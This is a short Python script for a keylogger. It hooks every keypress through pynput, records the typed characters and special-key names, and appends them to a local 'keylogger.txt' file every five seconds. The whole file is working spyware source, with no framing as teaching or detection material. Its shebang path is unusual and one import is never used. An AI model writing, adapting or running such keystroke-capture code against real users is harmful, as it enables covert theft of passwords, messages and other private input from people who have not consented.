#!/usr/share/python3
import pynput.keyboard
import threading
from keyboard import press

keys = ""

def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		elif key == key.enter:
			keys = keys + ('\n')
		elif key == key.right:
			keys = keys + ""
		elif key == key.left:
			keys = keys + ""
		elif key == key.up:
			keys = keys + ""
		elif key == key.down:
			keys = keys + ""
		else:
			keys = keys + " " + str(key) 

def printKeys():
	global keys
	fin = open("keylogger.txt","a")
	fin.write(keys)
	keys = ""
	fin.close()
	timer  = threading.Timer(5, printKeys)
	timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
	printKeys()
	keyboard_listener.join()
